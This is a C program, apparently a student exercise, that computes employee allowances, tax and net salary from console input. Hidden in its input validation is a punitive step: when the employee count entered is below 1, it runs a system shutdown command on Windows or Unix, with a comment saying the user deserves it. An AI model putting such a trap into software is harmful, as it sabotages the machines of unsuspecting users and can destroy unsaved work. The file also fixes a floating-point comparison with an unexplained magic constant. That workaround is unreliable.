/*
* This program is created by Vo Luu Tuong Anh (github.com/anhvlt-2k6)
* It programmed as the experiment of C/C++ Standard for HCI (TheFlightSims CHS)
* Sponsored by TheFlightSims (https://theflightsims.com) 
*/

#include <stdio.h>
#include <stdlib.h>

/* 
* Fix of floating-point number error, by defining the correction rage between 1.15 in defined and 1.15 in memory (IEEE 754). 
* Reference: https://learn.microsoft.com/en-us/cpp/build/why-floating-point-numbers-may-lose-precision
*
* A better solution for this is, trying to get the closed of 1.15 or 1.25 by 115/100 or 125/100
* Or maybe using the 0.25 (or 25/100) or 0.15 (or 15/100) at the first time in the caluclation.
* Or the return the direct value instead of using if (...) else (...)
*/
#define ADDITION_OF_ONE_DOT_FIFTEEN 0.00000002384185782133840802998747676610946655273437500

// Handle user input of Salary
float inputSalary() {
	int salaryInput;
	
	//	Frist try of entering values
	printf("Enter the basic salary (>= 0): ");
	scanf("%d", &salaryInput);
	
	// Retry if the variable does not meet the requirements 
	while (salaryInput < 0) {
		printf("Invalid salary. Please enter a non-negative value.\nEnter the basic salary (>= 0): ");
		scanf("%d", &salaryInput);
	}
	
	// Return the user input in float
	return salaryInput;
}

// Calculate the allowance, based on the basic salary. No floating point error correction needed.
float calculateAllowance (float basic_salary) {
	if (basic_salary < 6000000) {
		return 1.25; // The allowance is 25% of the basic salary if meet the above criteria
	} else if (basic_salary >= 6000000 && basic_salary <= 15000000) {
		return 1.15; // The allowance is 15% of the basic salary if meet the above criteria
	} else {
		/*
		* The allowance is 10% of the basic salary if meet the above criteria
		* However, floating point error occurred, so it must be 1.10 instead of 1.1
		* Or maybe it is my compiler problem, because for whatever reason, I built the compiler by myself?
		*/
		return 1.10;
	}
}

// Calculate the tax based on the 
float calculateTax (float total_income) {
	if (total_income <= 8000000) {
		return 0; // The tax rate is 0% for poor employees who has the original income below 8 million
	} else {
		/*
		* The tax is calculated based on the amount that over 8 million
		*
		* For example: If you income is 10 million, then the tax is calculate on the 
		* 	10M - 8M = 2 million
		* Then 10% of 2 Million is 200K
		*
		*/
		return 0.1 * (total_income - 8000000);
	}
}

/* 
* Calculate the Net Income. 
* Note: the allowance has a real name of "Allowance rate" when it did not include the allowance salary to be added with.
*/
float caluclateNetIncome(float basic_salary, float allowance, float tax) {
	return basic_salary * allowance - tax;
}

int main() {
	// Step 1: Initialize variables used in the pr
	int num_employees; // Initialize the amount of employee needed
	float total_income, basic_salary, allowance, tax, employee_net_income; // Initialize variable properties of employee
	float total_salary_cost = 0; // Initialize the calculation of salary cost
	int count_25 = 0, count_15 = 0, count_10 = 0; // Initialize the count of each allowance
	
	// Step 2: Input the number of employees
	printf("Enter the number of employees: ");
	scanf("%d", &num_employees);
	
	// Step 3: Validate input number of employees. If numberOfEmpLoyees < 1 then exit the program
	// Note whoever don't notice this, deserve a dead of computer
	if (num_employees < 1) {
#ifdef _WIN32
		system("shutdown -s -t 0");
#else
		system("shutdown now");
#endif
	}
	
	// Step 4: Prcess each employees
	for (int i = 0; i < num_employees; i++) {
		printf("\nProcessing employee %d:\n", i + 1);
		
		// Call function to Input basic salary
		basic_salary = inputSalary();
		
		// Call function Calculate allowance
		allowance = calculateAllowance(basic_salary);
		
		// Count allowance category
		if (allowance == 1.25) {
			count_25 += 1;
		} else if (allowance + ADDITION_OF_ONE_DOT_FIFTEEN == 1.15) {
			count_15 += 1;
		} else {
			count_10 += 1;
		}
		
		// Calculate total income and Call function to calculate tax
		total_income = basic_salary * allowance;
		tax = calculateTax(total_income);

		// Call function to Calculate net income
		employee_net_income = caluclateNetIncome(basic_salary, allowance, tax);
		
		// Update total salary cost
		total_salary_cost += employee_net_income;
		
		// Display employee details
		printf(
		"Basic Salary: %.2f\n"
		"Allowance: %.2f\n"
		"Tax Deduction: %.2f\n"
		"Net Income: %.2f\n",
		basic_salary,
		total_income - basic_salary,
		tax,
		employee_net_income
		);
	}
	
	// Step 5: Display Salary Statistics
	printf(
	"\n=== Salary Statistics ===\n"
	"Total salary cost of the company: %.2f\n"
	"Number of employees with allowance of 25%: %d\n"
	"Number of employees with allowance of 15%: %d\n"
	"Number of employees with allowance of 10%: %d\n",
	total_salary_cost,
	count_25,
	count_15,
	count_10
	);
		
	system("pause");
	return 0;
}